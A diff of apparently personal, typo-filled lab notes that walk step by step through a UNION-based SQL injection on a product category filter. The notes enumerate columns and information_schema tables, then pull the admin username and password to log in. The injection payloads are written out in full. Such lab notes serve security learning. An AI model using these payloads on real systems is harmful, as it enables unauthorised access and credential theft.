@@ -1,25 +1,26 @@
-The goal to output data from other tables
+The goal to login as administrator
 
 Analysis 
     * SQL injection vulnerability in the product category
-    * UNION attack to retrieve data from other tables.
+    * UNION attack to retrieve usernaem & password from users table.
+    * use this data to login as admin
 
 attack procedure 
     1- dertemind the number of colums by using order cluase
         query:' ORDER BY 3-- =>error=>3-1=2 cols
       
     2- dertemind string datatype to use it for username and password
-        1-query:' UNION SELECT 'kk' 'kk' -- =>OK =>Both col data-type col1 string
-    
-    3- we dont know the table of users so we need to know it 
+        1-query:' UNION SELECT 'kk' 'kk' -- =>OK =>Both col1 and col2 are string data-type 
+
+    3- we don't know the users table so we need to know it 
         *query= ' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables=>OK
-            form this query we will know all colums names
+        form this query we will know all colums names
         found users name tabel => users_xxjnhl
     
     4- know we want to find the namw username & password colums in users_xxjnhl table
         *query = ' UNION SELECT COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS
                 where  TABLE_NAME = 'users_xxjnhl'
-        found username & password => username_kcmsov,password_uplduk
+        found col = username  , col = password => username_kcmsov,password_uplduk
     
     5- get the username & password of admin using information above
         *query = 'UNION SELECT username_kcmsov,password_uplduk from users_xxjnhl --
